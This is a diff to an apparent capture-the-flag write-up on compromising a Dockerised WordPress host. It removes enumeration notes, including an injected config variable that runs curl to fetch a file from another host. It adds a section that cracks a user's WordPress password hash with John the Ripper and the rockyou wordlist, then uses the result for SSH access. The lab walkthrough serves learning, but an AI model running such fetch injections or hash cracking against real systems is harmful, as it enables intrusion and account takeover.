@@ -154,14 +154,15 @@ Ba2k3t
 ![image](https://user-images.githubusercontent.com/5285547/129023572-fb616155-d3d8-4bf5-ae59-5dc601f93ac3.png)
 
 
+## Password Crack. 
 
-/usr/src/wordpress/wp-config-docker.php  
-/var/www/html/wp-config-docker.php
-/home/alatar/wordpress/html /var/www/html rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
-/etc/ImageMagick-6/mime.xml
-/usr/local/bin/docker-entrypoint.sh
+Having the hash for all the users, I managed to crack one called gandolf
 
-172.17.0.2      mysql a9400b1a26c0 wordpressdb
-172.17.0.3      a5610f5f2480
+gandolf:$P$BGOXSxRtzMKFKkRZ246loTIXH5AFQm/
 
-export WORDPRESS_CONFIG_EXTRA='curl 192.168.1.96/test -o /tmp/test'
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+Using this we can ssh onto the box as gandalf. 
+
